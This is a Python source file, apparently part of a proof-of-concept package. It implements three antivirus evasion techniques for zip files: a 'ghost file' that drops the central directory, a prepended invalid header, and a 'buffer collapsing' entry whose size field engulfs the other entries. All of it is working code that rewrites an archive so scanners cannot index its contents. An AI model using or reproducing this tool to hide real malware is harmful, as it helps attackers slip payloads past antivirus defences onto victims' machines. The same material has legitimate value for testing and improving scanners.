"""This implements three antivirus evasion technique for zip files

    The three different techniques to choose from are Ghost File,
    Invalid File Header, and File Buffers Collapsing.

    Technique One Ghost File:
    Removes the central directory from the zip file so it can't be used to index
    the archive contents.

    Technique Two Invalid File Header:
    Adds an invalid header to the beginning of the file to prevent the archive
    from being indexed based on the local file headers.

    Technique Three File Buffer Collapsing:
    Adds a file at the beginning of the archive with an edited file size to
    engulf any other files in the archive to prevent indexing of the files from
    the local file headers.

"""
import os

from evasion_poc import utils
from .zip_file import Zip_file


def read_in_file(file_loc):
    """Reads in the specified file and returns the hex

    Args:
        file_loc (str): The location of the zip file to read in

    Returns:
        str: The string representation of the hex of the file
    """
    with open(file_loc, 'rb') as f:
        file_hex = f.read().hex().lower()

    return file_hex


def _create_new_file_path(file_loc, techniques={}):
    """Creates a new path to the new location of the edited zip file

    The new path is the same as the old with
    'flags_' and the evasion technique added in front of the old file name

    Args:
        file_loc (str): The path to the original file
        techniques (dir): What techniques were used for evasion

    Returns:
        str: The path to the location of the new file
    """
    # splits the file path between the head and the file name
    # head_tail[0]: path to the file
    # head_tail[1]: the name of the file
    head_tail = os.path.split(file_loc)
    prefix = 'flags'
    if 'ghost' in techniques:
        prefix = f'{prefix}_g'
    if 'invalid_header' in techniques:
        prefix = f'{prefix}_i'
    if 'buffer_collapsing' in techniques:
        prefix = f'{prefix}_b'

    prefix = f'{prefix}_'
    new_path = os.path.join(head_tail[0], f'{prefix}{head_tail[1]}')

    return new_path


def write_out_file(file_loc, contents, techniques):
    """Writes the edited file out to disk

    The location of the new file it the same as the old with an updated name

    Args:
        file_loc (str): The location of the original file
        contents (srt): What will be written to the new file
        techniques (dir): What technique was used for evasion
    """
    new_file_path = _create_new_file_path(file_loc, techniques)
    with open(new_file_path, 'wb') as f:
        f.write(bytes.fromhex(contents))
    print(f'new file path: {new_file_path}')


def evade(file_loc, techniques):
    """The main function for the program

    Args:
        file_loc (str): The location of the original zip file for the exploit
        techniques (list): List of the techniques to use
    """
    original_file_hex = read_in_file(file_loc)
    zip_file = Zip_file(original_file_hex)
    end_central_dir = zip_file.get_end_central_dir()

    invalid_file_header = ('504b03040a00000000000000000067452301000000000000000'
                           '0ffff0000612f2f2f642f')

    buffer_collapsing_file = ('504B03040A00000000001A03C752ECDF4634280000002800'
                              '00000D000000636F6C6C61707365642E7478745468657365'
                              '206172656E2774207468652066696C657320796F7572206C'
                              '6F6F6B696E6720666F722E')

    if 'buffer_collapsing' in techniques:
        print('Collapsing the buffer')
        # pulls where the central directory starts to adjust the size of the new
        # file to cover all of the local headers
        start_central_dir = end_central_dir.get_offset_start_central_dir_from_start()
        new_file_size = utils.int_to_hex(start_central_dir + 40, 4)
        buffer_collapsing_file = (f'{buffer_collapsing_file[:18*2]}'
                                  f'{new_file_size}{new_file_size}'
                                  f'{buffer_collapsing_file[26*2:]}')
        zip_file.prepend_file(buffer_collapsing_file)

    if 'invalid_header' in techniques:
        print('Inserting invalid header')
        zip_file.prepend_file(invalid_file_header)

    new_zip_file = f'{zip_file.get_local_file_headers()}'

    # if not using the ghost technique add the central directory
    if 'ghost' not in techniques:
        new_zip_file = (f'{new_zip_file}{zip_file.get_central_dir_hex()}'
                        f'{end_central_dir.get_header_hex()}')
    else:
        print('Ghosting files')

    write_out_file(file_loc=file_loc,
                   contents=new_zip_file, techniques=techniques)
